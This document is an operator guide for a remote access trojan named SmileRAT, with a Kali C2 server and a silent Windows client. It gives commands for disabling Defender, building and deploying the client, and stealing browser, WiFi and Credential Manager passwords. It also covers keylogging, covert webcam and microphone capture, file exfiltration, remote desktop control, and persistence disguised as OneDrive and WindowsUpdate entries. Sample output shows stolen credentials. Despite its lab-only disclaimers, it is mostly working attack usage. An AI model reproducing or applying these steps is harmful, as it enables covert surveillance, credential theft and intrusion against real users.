# How to Use SmileRAT

A walkthrough for getting SmileRAT running in a lab. Kali VM on one side, Windows VM on the other.

**Read this first:** everything here assumes an isolated lab. Two VMs on a host-only or internal network. No production machines, no borrowed hardware, nothing you don't own. Running this anywhere else is a crime in most countries and I'm not being dramatic about that.

---

## What you need

**Kali side (the C2):**

- Python 3.8 or newer
- `cryptography` — for AES-GCM
- `Pillow` — for the live RD viewer
- `colorama` — optional, just makes the terminal prettier

**Windows side (the target):**

- Nothing to run it. `SmilyyRat.exe` is a static build.
- To compile it yourself, you need MinGW-w64 (`g++` and `mingw32-make`), plus the SQLite amalgamation (`sqlite3.c` and `sqlite3.h`) dropped into `src/modules/`.

**Network:**

- The two VMs need to be able to reach each other. Host-only adapter works. So does internal networking.
- From Windows, `ping <kali-ip>` should succeed before you go further. If it doesn't, fix the network first — nothing else will work.

---

## How it's shaped

Two programs. The client runs on Windows and dials out to the C2 on port 4444. The C2 runs on Kali and listens.

```
Kali VM                          Windows VM
+------------------+             +------------------+
| c2_server.py     |  <-- TCP -- | SmilyyRat.exe    |
| listens :4444    |   AES-GCM   | connects out     |
| rd_viewer.py     |             |                  |
+------------------+             +------------------+
```

The reason the client dials out instead of the C2 dialing in: firewalls and NAT. Outbound connections almost always go through. Inbound almost never do. That's how every RAT works, not just this one.

Once the connection is up, there's a key exchange and everything after that is AES-256-GCM encrypted. The C2 sends commands, the client runs them, the client sends results back. Same connection the whole time.

---

## Getting the C2 ready

On Kali, install the Python side:

```
pip3 install cryptography colorama Pillow
```

If you're using a virtualenv, activate it first. If you're on a distro that blocks `pip3 install` system-wide (some do), use `pip3 install --user` or a venv.

Check it worked:

```
python3 -c "import cryptography; import colorama; import PIL; print('OK')"
```

`OK` means everything's there. If it errors on `PIL`, the C2 will still run — you just won't get the live viewer. Install Pillow separately and it'll pick it up next start.

Find your Kali IP:

```
ip a
```

You want the IP of the interface that reaches the Windows VM. Usually something like `192.168.56.10` or `192.168.1.50`. Write it down — the client needs it.

---

## Getting the client ready

Open `src/core/config.h`. Find this line:

```
const std::string C2_SERVER_IP = "127.0.0.1";
```

Change it to your Kali IP:

```
const std::string C2_SERVER_IP = "192.168.56.10";
```

Save.

### Handling Defender

Windows Defender will eat the binary the moment it hits disk. Two ways around it in the VM:

**Cleaner way:** add a folder exclusion. Windows Security → Virus & threat protection → Manage settings → Exclusions → Add or remove exclusions. Add the project folder, and add `%APPDATA%\Microsoft\Windows\` too — that's where persistence drops the copy.

**Blunter way:** Windows Security → Virus & threat protection → Manage settings → turn off Real-time protection. Then scroll down and turn off Tamper Protection.

If you leave Tamper Protection on, the RAT's own Defender bypass won't work. That's not a bug — it's Microsoft doing exactly what Tamper Protection is for. Turn it off once, manually, and the RAT keeps Defender off after that.

### Take a snapshot

Before you run anything. VirtualBox → Machine → Take Snapshot. Name it something obvious. If anything goes sideways, revert and you're back where you started.

---

## Building it

### Windows

In `cmd.exe`, from the project folder:

```
mingw32-make clean
mingw32-make
```

This takes a while — around 2 to 4 minutes — because SQLite is a 250k-line file and needs compiling. First build is slow; rebuilds are fast.

You'll end up with `SmilyyRat.exe` in the project root. Check:

```
dir SmilyyRat.exe
```

Should be around 5 to 6 MB.

### Linux cross-compile

If you'd rather build on Linux:

```
sudo apt install g++-mingw-w64-x86-64
make clean
make
```

Same output. Copy the `.exe` to your Windows VM.

### When the build breaks

Three things that go wrong most often:

**`missing separator`** — the Makefile uses tabs, and your editor converted them to spaces. Notepad does this. Open the Makefile in VS Code or Notepad++ and check that the recipe lines under `$(TARGET):` and the two `%.o:` rules actually start with tabs.

**`undefined reference to MFEnumDeviceSources`** — the webcam code needs `-lmf`. If it's missing from `LIBS`, add it.

**`sqlite3.c: No such file or directory`** — you haven't put the amalgamation in `src/modules/` yet. Download it from sqlite.org, unzip, drop the two files in.

Anything else — paste the actual compiler output and read it top-down. The first error is the one that matters. Everything after it is usually noise.

---

## Running it

### Start the C2

On Kali:

```
python3 c2_server.py
```

You should see something like:

```
  +----------------------------------------+
  |   SmileRAT C2 v4.1 (AES + Full Cmds)   |
  |        0.0.0.0:4444                    |
  |        viewer ready                    |
  +----------------------------------------+

  Type 'help' for commands

[+] C2 listening on 0.0.0.0:4444
C2>
```

If it says `viewer OFF` instead of `viewer ready`, Pillow isn't installed. The C2 still works — you just won't have `rd_view`. Install Pillow and restart.

If port 4444 is firewalled (ufw, firewalld), open it:

```
sudo ufw allow 4444/tcp
```

To listen on a different port:

```
python3 c2_server.py -p 5555
```

But then you have to change `C2_SERVER_PORT` in `config.h` and rebuild the client. Easier to just use 4444.

### Start the client

On the Windows VM, open a fresh `cmd.exe` — not the one you built in:

```
cd C:\path\to\project
SmilyyRat.exe
```

Nothing will appear. The binary is built with `-mwindows` so it runs silently. That's the whole point. Check it's running:

```
tasklist | findstr Smilyy
```

You should see it, with a PID.

---

## Confirming they're talking

Back on Kali, the C2 should print within a few seconds:

```
[+] Client [1] connected (encrypted) from 192.168.56.20:52341
```

Then:

```
C2> list
```

Should show something like:

```
Clients:
  ID | IP              | Info
----------------------------------------------------------------------
   1 | 192.168.56.20   | INFO|DESKTOP-XXXXX|user|Windows 10.0.19045|x64
```

If nothing connects, skip to the troubleshooting section at the bottom.

First real test:

```
C2> shell 1 whoami
```

Expected:

```
[Client 1] SHELL_OUTPUT|desktop-xxxxx\user
```

That's the actual Windows username. If you see it, the round trip works — handshake, encryption, command dispatch, output, all of it.

---

## Commands

### C2-side

| Command | What it does |
|---|---|
| `list` | Show connected clients |
| `interact <id>` | Talk to one client without retyping the ID |
| `broadcast <cmd>` | Same command to every client |
| `stats` | Server stats |
| `clear` | Clear the screen |
| `exit` / `quit` | Shut down |

### Against a client

`<id>` is the number from `list`.

| Command | What it does |
|---|---|
| `system <id>` | OS version, CPU, RAM |
| `shell <id> <cmd>` | Run a shell command, get output |
| `screenshot <id>` | Screen to BMP, saved in `screenshots/` |
| `keylog <id> start\|stop\|get` | Keylogger control |
| `steal <id> passwords\|wifi\|browser\|all` | Pull stored credentials |
| `webcam <id>` | One JPEG frame, saved in `webcam/` |
| `microphone <id> [secs]` | Record to WAV, saved in `mic/` |
| `file <id> <op> <path> [dest]` | Filesystem ops — see below |
| `mouse <id> <x> <y> <btn> <wheel>` | Move/click |
| `keyboard <id> <vk> <down>` | Press/release a key |
| `fdownload <id> <remote>` | Pull a file from the client |
| `fupload <id> <local> <remote>` | Push a file to the client |

### File ops

```
file 1 list C:\Users
file 1 mkdir C:\test
file 1 delete C:\test\file.txt
file 1 copy C:\a.txt C:\b.txt
file 1 move C:\a.txt C:\folder\a.txt
file 1 rmdir C:\test
```

### Mouse

```
mouse 1 50 50 1 0
```

- `50 50` is x/y as a percentage of the screen, 0 to 100.
- `1` is the button. `0` for none, `1` for left, `2` for right, `3` for middle.
- `0` is wheel movement. Positive scrolls up, negative scrolls down. Each notch is 120.

So `mouse 1 10 90 1 0` clicks near the bottom-left. `mouse 1 50 50 0 -240` scrolls down two notches at the center.

### Keyboard

```
keyboard 1 65 1
keyboard 1 65 0
```

`65` is the VK code for 'A'. `1` presses, `0` releases. You need both — a press without a release leaves the key stuck.

Common codes: A–Z are 65–90, 0–9 are 48–57, Enter is 13, Backspace is 8, Space is 32, Esc is 27, Tab is 9. Microsoft has the full list if you search "Virtual-Key Codes".

### interact mode

If you're sending a bunch of commands to one client:

```
C2> interact 1
[Client 1]> shell whoami
[Client 1]> shell ipconfig
[Client 1]> system
[Client 1]> back
C2>
```

Same commands, just without the ID every time. `back` returns to the main prompt.

---

## Live remote desktop

```
C2> rd_view 1
```

A Tkinter window opens and starts showing the client's screen.

**In the window:**

- Left-click sends a left-click to the client at that position.
- Right-click sends right-click.
- Mouse movement sends cursor moves (throttled — about 12 Hz, so it doesn't flood).
- Scroll wheel works.
- Typing goes to the client.
- **Stop Stream** halts the client's capture loop.
- **Closing the window** stops the stream and cleans up the viewer.

### Adjusting on the fly

While the viewer is open, from the C2 prompt:

```
rd_settings 1 fps=15 quality=60
```

`fps` is frames per second, 1 to 60. `quality` is JPEG quality, 1 to 100. Higher quality means sharper frames, larger size, more bandwidth. The defaults are `fps=10 quality=70`, which at 1080p is about 1.5 MB/s.

Rough bandwidth numbers at 1080p:

| fps | quality | Approx. bandwidth |
|---|---|---|
| 5 | 50 | ~300 KB/s |
| 10 | 70 | ~1.5 MB/s |
| 15 | 80 | ~3 MB/s |

If the connection is slow, drop to `fps=5 quality=50`. If it's fast and you want smooth, go `fps=20 quality=75`.

### If the viewer won't open

C2 said `viewer OFF` at startup. Install Pillow and restart the C2.

### If the viewer opens black

Wait two or three seconds — the first frame takes a moment while the client initializes GDI and WIC.

If it stays black after five seconds: on the C2 you should have seen `RD_OK|streaming started`. If you didn't, the client never got the `rd_start` command. If you did and frames arrive but are black, it's usually a VM display problem — try a smaller resolution, or disable 3D acceleration in the VM settings.

---

## Moving files

### Pull a file from the client

```
C2> fdownload 1 C:\Users\user\Desktop\secret.txt
```

You'll see progress:

```
[*] Requested C:\Users\user\Desktop\secret.txt from client 1
[*] Incoming file: C:\Users\user\Desktop\secret.txt
[*] 512000/1024 (50.0%)
[*] 1024/1024 (100.0%)
[+] Download complete: downloads/secret.txt (1024 bytes)
```

Saved to `downloads/` on the C2 machine.

### Push a file to the client

Have a file ready on Kali:

```bash
echo "hello from kali" > test.txt
```

Then:

```
C2> fupload 1 test.txt C:\Users\user\test.txt
[+] Uploaded 16 bytes to client 1 as C:\Users\user\test.txt
[*] FUPLOAD_READY|C:\Users\user\test.txt
[*] FUPLOAD_OK|16
```

Files are chunked at 512 KB, base64'd, encrypted, and reassembled on the other end.

**One file at a time.** While an upload is running, that client won't respond to other commands. Wait for the `FUPLOAD_OK` before sending anything else.

---

## Password stealer

```
C2> steal 1 all
```

Three things happen, in order:

1. **Browser passwords.** Chrome, Edge, Brave, Opera. Reads each browser's `Login Data` SQLite database, grabs the AES key from `Local State` (which is DPAPI-protected), and decrypts each password. Works whether the browser is open or closed — the code copies the DB to a temp file first.

2. **WiFi credentials.** Runs `netsh wlan show profile` for every saved network and pulls the cleartext password.

3. **Windows Credential Manager.** Enumerates the Credential Vault and dumps everything readable.

Output lands in `steal/steal_<id>_<timestamp>.txt`.

### What the output looks like

```
=== Browser Passwords ===
[Chrome] https://example.com/login
  user: victim@example.com
  pass: hunter2
[Edge] https://mail.example.com
  user: alice
  pass: correcthorsebatterystaple

=== WiFi ===
HomeNet | mywifipassword | WPA2-Personal

=== Windows Credentials ===
LegacyGeneric:target=git:https://github.com = ghp_xxxxxxxxxxxx
```

### Caveats

- Only works for the user the RAT is running as. Chrome passwords saved under a different Windows account won't decrypt.
- Firefox isn't supported — it uses NSS, which isn't linked in.
- If DPAPI decryption fails (usually a different-user situation), the password shows as `[decrypt failed]`.

---

## Webcam and mic

### Webcam

```
C2> webcam 1
[+] Webcam frame saved: webcam/webcam_1_1700000000.jpg (84321 bytes)
```

JPEG, 80% quality. Open it in any image viewer.

`WEBCAM_ERR|no device` means the VM doesn't have a camera. In VirtualBox: shut down the VM, Settings → USB → enable the controller, add a filter for your webcam, boot it up. Check Device Manager to confirm Windows sees it.

### Microphone

```
C2> microphone 1 10
[+] Microphone recording saved: mic/mic_1_1700000000.wav (320000 bytes)
```

10 seconds in this example. Default is 5. Output is 16-bit PCM WAV at whatever rate the device runs at. Plays in VLC.

`MICROPHONE_ERR|no device` means audio input isn't enabled. VirtualBox: Settings → Audio → Enable Audio → Enable Audio Input.

**Watch out:** recording is synchronous. A 30-second recording means no other commands to that client for 30 seconds. It also blocks the main command loop. Keep clips short.

---

## Persistence

No command needed — this happens automatically the first time the client runs.

Four things get installed:

1. A copy of the binary at `%APPDATA%\Microsoft\Windows\OneDriveSyncHelper.exe`
2. A registry Run key at `HKCU\...\Run\WindowsUpdate` pointing at the copy
3. A copy in the Startup folder as `OneDriveSyncHelper.exe`
4. A scheduled task named `WindowsUpdate` that runs at boot (as SYSTEM, if the RAT has admin) or at logon (user-level fallback)

### Confirm it worked

On the Windows VM:

```
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate
schtasks /Query /TN WindowsUpdate
dir "%APPDATA%\Microsoft\Windows\OneDriveSyncHelper.exe"
```

All three should return data.

### Test it

Reboot the VM. After logon:

```
tasklist | findstr Smilyy
```

If it's running again, persistence works.

### Removing it

```
schtasks /Delete /TN WindowsUpdate /F
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /f
del "%APPDATA%\Microsoft\Windows\OneDriveSyncHelper.exe"
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSyncHelper.exe"
taskkill /F /IM SmilyyRat.exe
```

Or just revert the VM snapshot. Honestly, cleaner.

---

## When something doesn't work

### Client won't connect

Run these in order:

```
tasklist | findstr Smilyy
```

Is the client even running? If not, it exited or Defender ate it.

On Kali:

```
ss -tlnp | grep 4444
```

Is the C2 actually listening?

On Windows:

```
ping <kali-ip>
```

If this fails, it's a network problem. Fix that before anything else — the RAT is not the issue.

On Kali:

```
sudo ufw allow 4444/tcp
```

Firewall on the C2 side.

Finally, check the client config:

```
type src\core\config.h
```

Does `C2_SERVER_IP` show your Kali IP? If you changed it, did you rebuild? `config.h` is a header — changing it without `mingw32-make` doesn't do anything.

### "Client 1 failed handshake"

The TCP connection succeeded but the key exchange didn't. Check:

- Client and C2 are both the current version. Old binaries with new servers (or vice versa) won't work.
- Nothing between them is intercepting TCP (transparent proxies, some VPN setups).
- You're actually running `SmilyyRat.exe` and not an earlier build sitting in the same folder.

### Commands return nothing

- Is the client still connected? Run `list`.
- Try `interact 1` then type the command without the ID. If that works, the direct form has a bug.
- Check `C:\rat.log` on the Windows VM for errors.

### Defender ate it

Add a folder exclusion or disable real-time protection. See the earlier section. It won't get better on its own.

### C2 crashed with `IndentationError`

You edited `c2_server.py` in Notepad. Windows Notepad defaults to cp1252 encoding, and the box-drawing characters in the banner are UTF-8. Reopen in VS Code or Notepad++ and save as UTF-8. Or just download the file fresh.

### Build errors

See the build section. The first error is the one that matters.

---

## Cleaning up

Stop the C2: `exit` at the prompt, or Ctrl+C.

Stop the client:

```
taskkill /F /IM SmilyyRat.exe
```

If persistence is active it'll come back on the next reboot, so remove persistence first if you want it gone for good.

Full reset: revert the snapshot. That's what snapshots are for.

---

## One last thing

This is a lab tool. It disables Defender, installs persistence, steals credentials, and captures screens. All of that is fine in a VM you control. None of it is fine anywhere else.

Running this against a machine you don't own — even "just to see if it works" — is a federal crime in the US, a criminal offense in the UK and most of Europe, and prosecuted regularly. People go to prison for it. Not "get a warning" — prison.

Keep it in the lab. Learn from it there. That's the whole point.

**Stay legal.**